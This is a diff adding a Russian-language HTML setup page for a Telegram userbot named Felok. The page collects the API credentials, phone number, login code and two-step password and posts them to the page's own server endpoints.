@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&display=swap" rel="stylesheet">
+    <meta charset="UTF-8">
+    <title>Felok</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="background"></div>
+
+  <div class="brand">
+    <img src="assets/logo.png" alt="Felok">
+  </div>
+
+  <div class="spec">
+    <img src="assets/ub.png" alt="Userbot">
+  </div>
+
+  <div class="side-panel" id="panel">
+
+
+    <div class="screen active" id="welcome">
+      <h2>Добро пожаловать</h2>
+      <button onclick="showForm()">Приступить к настройке</button>
+    </div>
+
+    <div class="screen" id="password-form">
+      <div class="field">
+        <span class="icon">☁️</span>
+        <input type="password"
+               placeholder="Облачный пароль"
+               autocomplete="off"
+               id="password">
+      </div>
+
+      <button onclick="sendPassword()">Подтвердить</button>
+    </div>
+
+    <div class="screen" id="code-form">
+        <div class="field">
+            <span class="icon">🔐</span>
+            <input type="text" placeholder="Код подтверждения" autocomplete="off" id="code">
+        </div>
+        <button onclick="sendCode()">Подтвердить</button>
+    </div>
+
+    <div class="screen" id="form">
+      <div class="field">
+        <span class="icon">🔑</span>
+        <input type="text" placeholder="API Id" autocomplete="off" id="ai">
+      </div>
+
+      <div class="field">
+        <span class="icon">🧬</span>
+        <input type="password" placeholder="API Hash" autocomplete="off" id="ah">
+      </div>
+
+      <div class="field">
+        <span class="icon">📱</span>
+        <input type="tel" placeholder="Телефон" autocomplete="off" id="p">
+      </div>
+
+      <button onclick="sendcr()">Продолжить</button>
+    </div>
+
+  </div>
+
+  <!-- Инструкция справа, изначально скрыта -->
+  <div class="instruction-panel" id="instruction">
+    <h2>Как получить API ID и API Hash</h2>
+    <p>1. Перейдите на <a href="https://my.telegram.org" target="_blank">my.telegram.org</a> и войдите в аккаунт.</p>
+    <p>2. Выберите раздел <strong>API development tools</strong>.</p>
+    <p>3. Создайте новое приложение. Название приложения не должно содержать слово <strong>Userbot</strong>.</p>
+    <p>4. После создания вы получите <strong>API ID</strong> и <strong>API Hash</strong>.</p>
+  </div>
+
+  <script>
+    function showForm() {
+
+        const panel = document.getElementById("panel");
+        const welcome = document.getElementById("welcome");
+        const form = document.getElementById("form");
+        const instruction = document.getElementById("instruction");
+
+        welcome.classList.remove("active");
+        form.classList.add("active");
+
+        panel.classList.add("move-left");
+
+        instruction.classList.add("show");
+    }
+
+    function sendcr() {
+        const panel =document.getElementById("form");
+        const ai = document.getElementById("ai").value.trim();
+        const ah = document.getElementById("ah").value.trim();
+        const p = document.getElementById("p").value.trim();
+
+        if (!ai || !ah || !p) {
+            alert("Заполните все поля");
+            return;
+        }
+
+        fetch("/", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                api_id: ai,
+                api_hash: ah,
+                phone: p
+            })
+        }).then(res => res.text())
+            .then(data => {
+                if (data === "code") {
+                    CodeStep();
+                }
+            })
+    }
+
+    function CodeStep() {
+      const bg = document.querySelector(".background");
+      const form = document.getElementById("form");
+      const codeForm = document.getElementById("code-form");
+      const instruction = document.getElementById("instruction");
+
+      bg.classList.add("step2");
+
+      form.classList.remove("active");
+      codeForm.classList.add("active");
+
+      instruction.innerHTML = `
+        <h2>Подтверждение входа</h2>
+        <p>
+          Telegram отправил код подтверждения в ваш аккаунт.
+        </p>
+        <p>
+          Сообщение приходит от служебного чата с номером <strong>42777</strong>.
+        </p>
+        <p>
+          Введите полученный код для завершения авторизации.
+        </p>
+      `;
+    }
+
+    function twa() {
+      const codeForm = document.getElementById("code-form");
+      const passForm = document.getElementById("password-form");
+      const instruction = document.getElementById("instruction");
+
+      codeForm.classList.remove("active");
+      passForm.classList.add("active");
+
+      instruction.innerHTML = `
+        <h2>Облачный пароль</h2>
+        <p>
+          Для входа требуется <strong>двухэтапная аутентификация</strong>.
+        </p>
+        <p>
+          Введите облачный пароль от вашего Telegram аккаунта.
+        </p>
+      `;
+    }
+
+    function sendPassword() {
+      const password = document.getElementById("password").value.trim();
+
+      if (!password) {
+        alert("Введите пароль");
+        return;
+      }
+
+      fetch("/p", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          password: password
+        })
+      })
+      .then(res => res.text())
+      .then(data => {
+        if (data === "done") {
+          window.location.href = "/d";
+        }
+        if (data === "incorrect") {
+          document.getElementById("password-form").classList.add("inc");
+        }
+      });
+    }
+
+    function sendCode() {
+        const code = document.getElementById("code").value.trim();
+
+        fetch("/c", {
+            method:"POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                code: code
+            })
+        }).then(res => res.text()).then(data => {
+            if (data === "done") {
+                window.location.href = "/d";
+            }
+            if (data === "password") {
+                twa();
+            }
+            if (data === "incorrect") {
+                const cf = document.getElementById("code-form");
+                cf.classList.add("inc")
+            }
+        })
+
+    }
+
+
+  </script>
+
+</body>
+</html>
